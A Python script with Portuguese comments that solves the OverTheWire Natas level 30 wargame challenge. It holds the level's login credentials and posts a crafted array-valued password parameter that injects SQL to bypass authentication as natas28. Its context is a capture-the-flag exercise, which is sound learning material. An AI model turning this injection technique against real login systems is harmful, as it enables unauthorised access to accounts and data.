# Importando as bibliotecas necessárias

# Para adicionar delays, fazendo o programa "pausar" por alguns segundos
import time

# Biblioteca para fazer requisições HTTP
import requests

# Para usar a autenticação HTTP Básica
from requests.auth import HTTPBasicAuth

# Para colorir a saída do terminal
from colorama import Fore, Back, Style, init

# Inicializando o colorama para usar cores no terminal (garante que a cor funcione no Windows também)
init(autoreset=True)

# Definindo as credenciais de autenticação (usuário e senha) que serão passadas nas requisições HTTP
basicAuth = HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

# A URL onde estamos fazendo a requisição
u = "http://natas30.natas.labs.overthewire.org/index.pl"

# Parâmetros do ataque (em que estamos tentando explorar a vulnerabilidade)
# A senha é definida de forma maliciosa, usando uma injeção SQL
params = {
    "username": "natas28",                  # O nome de usuário alvo
    "password": ["'whatever' or 1", 4]      # Tentando injetar SQL no campo de senha
}

# Imprimindo uma introdução estilizada com cores e formatação
print(Fore.GREEN + Style.BRIGHT + "#############################")
print(Fore.GREEN + Style.BRIGHT + "#        Natas30 Hack       #")
print(Fore.GREEN + Style.BRIGHT + "#############################\n")

# Pausa de 1 segundo para dar a impressão de que algo está acontecendo
time.sleep(1)

# Informando o usuário que estamos "iniciando" o ataque, com uma cor amarela para dar mais ênfase
print(Fore.YELLOW + Style.BRIGHT + "Iniciando ataque...")

# Espera 2 segundos, simulando uma ação que está em andamento
time.sleep(2)

# Realizando a requisição HTTP POST para a URL definida, com os parâmetros e autenticação fornecidos
response = requests.post(u, data=params, auth=basicAuth, verify=False)

# Exibindo o resultado da requisição com mais estilo
print("\n" + Fore.CYAN + Style.BRIGHT + "Resultado da Requisição:\n")

# Pausa de 1 segundo para simular processamento
time.sleep(1)

# Checando se a resposta da requisição foi bem-sucedida
if response.status_code == 200:

    # Se a requisição foi bem-sucedida, imprime um texto verde e o conteúdo da resposta
    print(Fore.GREEN + Style.BRIGHT + "[+] Requisição bem-sucedida!")

    # Exibe o conteúdo da página acessada
    print(Fore.WHITE + response.text)

else:
    # Se houve erro, imprime um texto vermelho indicando falha
    print(Fore.RED + Style.BRIGHT + "[-] Erro ao tentar acessar a página!")

    # Exibe o conteúdo da página, mesmo que não tenha sido sucesso
    print(Fore.WHITE + response.text)

# Imprimindo uma mensagem de encerramento com estilo
print("\n" + Fore.RED + Style.BRIGHT + "#############################")
print(Fore.RED + Style.BRIGHT + "#         Fim do hack       #")
print(Fore.RED + Style.BRIGHT + "#############################")
